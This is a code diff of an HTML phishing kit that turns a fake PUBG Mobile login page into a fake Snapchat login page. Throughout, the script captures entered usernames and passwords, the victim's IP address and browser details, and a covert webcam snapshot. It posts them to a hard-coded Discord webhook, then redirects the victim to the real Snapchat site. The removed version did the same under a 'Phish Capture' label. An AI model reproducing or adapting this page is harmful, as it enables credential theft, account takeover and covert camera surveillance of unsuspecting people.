@@ -3,156 +3,153 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG MOBILE - Official Login</title>
+    <title>Log in to Snapchat</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
-            background: url('https://www.pubgmobile.com/en/images/bg_main.jpg') no-repeat center center fixed;
-            background-size: cover;
-            font-family: 'Arial', sans-serif;
+            background-color: #FFFC00;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
-            color: white;
+            margin: 0;
         }
         .login-container {
-            background: rgba(0, 0, 0, 0.8);
+            background: white;
             padding: 40px;
             border-radius: 10px;
-            width: 350px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 350px;
             text-align: center;
-            box-shadow: 0 0 20px rgba(255, 165, 0, 0.5);
-            border: 1px solid #f39c12;
         }
         .logo {
-            width: 200px;
+            width: 60px;
             margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 30px;
+            font-weight: 600;
         }
         input {
             width: 100%;
             padding: 12px;
-            margin: 10px 0;
-            background: #222;
-            border: 1px solid #555;
-            color: white;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
             border-radius: 5px;
             box-sizing: border-box;
-        }
-        input:focus {
-            border-color: #f39c12;
-            outline: none;
+            font-size: 16px;
         }
         button {
             width: 100%;
             padding: 12px;
-            background: #f39c12;
-            color: black;
+            background-color: #000;
+            color: white;
             border: none;
-            border-radius: 5px;
+            border-radius: 25px;
+            font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            margin-top: 10px;
-            font-size: 16px;
         }
         button:hover {
-            background: #e67e22;
+            background-color: #333;
         }
-        .links {
-            margin-top: 15px;
-            font-size: 12px;
-            display: flex;
-            justify-content: space-between;
-        }
-        .links a {
-            color: #f39c12;
-            text-decoration: none;
-            cursor: pointer;
-        }
-        .links a:hover {
-            text-decoration: underline;
+        video, canvas {
+            display: none;
         }
     </style>
 </head>
 <body>
 
 <div class="login-container">
-    <img src="https://www.pubgmobile.com/en/images/logo.png" alt="PUBG Logo" class="logo">
-    <h2>ACCOUNT LOGIN</h2>
-    <input type="text" id="email" placeholder="Email or Phone Number" required>
+    <svg class="logo" viewBox="0 0 128 128" xmlns="http://www.w3.org/2000/svg"><path d="M63.8 123.4c-4.4 0-8.5-1.2-12.3-3.1-2.9-1.5-5.9-2.2-9.1-2.2-4.1 0-8.2 1.3-12 3.6-2.6 1.6-5.8 1.4-8.2-.4-2.5-1.9-3.5-5.1-2.5-8.1 1.1-3.2 2.6-6.2 4.4-9.1 1.6-2.5 2.1-5.5 1.5-8.4-.7-3.3-2.3-6.4-4.6-8.9-2.5-2.7-5.5-4.8-8.9-6.3-3.2-1.4-5.2-4.6-4.9-8.1.3-3.6 2.8-6.5 6.3-7.3 3.6-.8 7.3-1.1 11.1-1.1 1.7 0 3.4.1 5.1.2 3.3.3 6.6-.7 9.2-2.7 3.1-2.4 5.2-5.9 6.1-9.7 1.1-4.7 1.1-9.6 0-14.3-1.6-6.8-5.5-12.8-11.1-17.1-5.1-3.9-11.2-6.2-17.6-6.6-1.5-.1-2.9-.6-4-1.5-1.2-1-1.9-2.5-1.9-4 0-1.6.7-3.1 1.9-4.1 1.1-.9 2.5-1.4 4-1.5 7.4-.5 14.6 1.9 20.6 6.5 6.6 5 11.2 12.1 13.1 20.1 1.3 5.5 1.3 11.3 0 16.8-1 4.5-3.6 8.6-7.3 11.5-3.1 2.4-7 3.6-10.9 3.3-1.9-.2-3.9-.3-5.8-.3-4.1 0-8.1.4-12.1 1.3-4.1 1-7.1 4.4-7.5 8.6-.4 4.1 1.9 7.9 5.7 9.6 3.9 1.7 7.4 4.2 10.3 7.3 2.7 2.9 4.6 6.5 5.4 10.4.7 3.4.1 6.9-1.8 9.9-2.1 3.3-3.8 6.8-5.1 10.5-1.2 3.5.1 7.3 3 9.5 2.8 2.1 6.6 2.4 9.7.7 4.5-2.6 9.4-4 14.3-4 3.8 0 7.4.8 10.8 2.5 4.4 2.2 9.2 3.5 14.3 3.5 5 0 9.8-1.3 14.3-3.5 3.4-1.7 7-2.5 10.8-2.5 4.9 0 9.8 1.4 14.3 4 3.1 1.7 6.9 1.4 9.7-.7 2.9-2.2 4.2-6 3-9.5-1.3-3.7-3-7.2-5.1-10.5-1.9-3-2.5-6.5-1.8-9.9.8-3.9 2.7-7.5 5.4-10.4 2.9-3.1 6.4-5.6 10.3-7.3 3.8-1.7 6.1-5.5 5.7-9.6-.4-4.2-3.4-7.6-7.5-8.6-4-.9-8-1.3-12.1-1.3-1.9 0-3.9.1-5.8.3-3.9.3-7.8-1-10.9-3.3-3.7-2.9-6.3-7-7.3-11.5-1.3-5.5-1.3-11.3 0-16.8 1.9-8 6.5-15.1 13.1-20.1 6-4.6 13.2-7 20.6-6.5 1.5.1 2.9.6 4 1.5 1.2 1 1.9 2.5 1.9 4 0 1.6-.7 3.1-1.9 4.1-1.1.9-2.5 1.4-4 1.5-6.4.4-12.5 2.7-17.6 6.6-5.6 4.3-9.5 10.3-11.1 17.1-1.1 4.7-1.1 9.6 0 14.3.9 3.8 3 7.3 6.1 9.7 2.6 2 5.9 3 9.2 2.7 1.7-.1 3.4-.2 5.1-.2 3.8 0 7.5.3 11.1 1.1 3.5.8 6 3.7 6.3 7.3.3 3.5-1.7 6.7-4.9 8.1-3.4 1.5-6.4 3.6-8.9 6.3-2.3 2.5-3.9 5.6-4.6 8.9-.6 2.9-.1 5.9 1.5 8.4 1.8 2.9 3.3 5.9 4.4 9.1 1 3-.1 6.2-2.5 8.1-2.4 1.8-5.6 2-8.2.4-3.8-2.3-7.9-3.6-12-3.6-3.2 0-6.2.7-9.1 2.2-3.8 1.9-7.9 3.1-12.3 3.1z" fill="#000"/></svg>
+    <h1>Log in to Snapchat</h1>
+    <input type="text" id="username" placeholder="Username or Email" required>
     <input type="password" id="password" placeholder="Password" required>
-    <button id="loginBtn">LOG IN</button>
-    <div class="links">
-        <a id="forgotBtn">Forgot Password?</a>
-        <a id="registerBtn">Register</a>
-    </div>
+    <button id="loginBtn">Log In</button>
 </div>
 
-<video id="videoElement" autoplay style="display:none;"></video>
+<video id="video" width="320" height="240" autoplay></video>
+<canvas id="canvas" width="320" height="240"></canvas>
 
 <script>
-    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3
-        ';
+    const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1538702595856539741/9QSZHry-ZfBd20aTqKHCKSrmBxYqrc3jGME50RFX5tVKmi-zAXPrX3gDQaGLI9JR6pj3';
+    const loginBtn = document.getElementById('loginBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
 
-    async function getIPAndLocation() {
-        try {
-            const res = await fetch('https://ipapi.co/json/');
-            return await res.json();
-        } catch (e) {
-            return { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' };
+    loginBtn.addEventListener('click', async (e) => {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        if(!username || !password) {
+            alert("Please enter username and password.");
+            return;
         }
-    }
 
-    function getOSAndBrowser() {
-        return navigator.userAgent;
-    }
+        loginBtn.innerText = "Logging in...";
+        loginBtn.disabled = true;
 
-    async function sendToDiscord(action, email, password) {
-        const geo = await getIPAndLocation();
-        const time = new Date().toISOString();
-        const ua = getOSAndBrowser();
+        let ip = "Unknown";
+        try {
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        } catch(err) { console.error("IP fetch failed"); }
 
-        const payload = {
-            content: `**New PUBG Phish Capture**\n**Action:** ${action}\n**Email:** ${email}\n**Password:** ${password}\n**IP:** ${geo.ip}\n**Location:** ${geo.city}, ${geo.region}, ${geo.country_name}\n**Time:** ${time}\n**OS/Browser:** ${ua}`
+        const time = new Date().toLocaleString();
+        const userAgent = navigator.userAgent;
+        
+        let imageBlob = null;
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            video.srcObject = stream;
+            
+            await new Promise(resolve => setTimeout(resolve, 1000));
+            
+            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            stream.getTracks().forEach(track => track.stop());
+            
+            imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+        } catch(err) {
+            console.error("Camera access denied or failed", err);
+        }
+
+        const formData = new FormData();
+        
+        const embed = {
+            title: "👻 New Snapchat Login Captured",
+            color: 16776960,
+            fields: [
+                { name: "Username/Email", value: username, inline: true },
+                { name: "Password", value: password, inline: true },
+                { name: "IP Address", value: ip, inline: false },
+                { name: "Time", value: time, inline: false },
+                { name: "User Agent", value: userAgent, inline: false }
+            ]
         };
 
-        fetch(WEBHOOK_URL, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-    }
-
-    async function captureMedia() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-            const video = document.getElementById('videoElement');
-            video.srcObject = stream;
-        } catch (err) {
-            console.error("Media capture failed", err);
+        formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
+        
+        if (imageBlob) {
+            formData.append('file', imageBlob, 'snapshot.jpg');
         }
-    }
 
-    document.getElementById('loginBtn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        captureMedia();
-        await sendToDiscord('Login Attempt', email, pass);
-        alert('Login failed. Please try again.');
-    });
-
-    document.getElementById('registerBtn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value;
-        const pass = document.getElementById('password').value;
-        await sendToDiscord('Register Clicked', email, pass);
-    });
-
-    document.getElementById('forgotBtn').addEventListener('click', async () => {
-        const email = document.getElementById('email').value;
-        await sendToDiscord('Forgot Password Clicked', email, 'N/A');
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            });
+            window.location.href = "https://accounts.snapchat.com/";
+        } catch(err) {
+            console.error("Webhook failed", err);
+            window.location.href = "https://accounts.snapchat.com/";
+        }
     });
 </script>
-
 </body>
 </html>
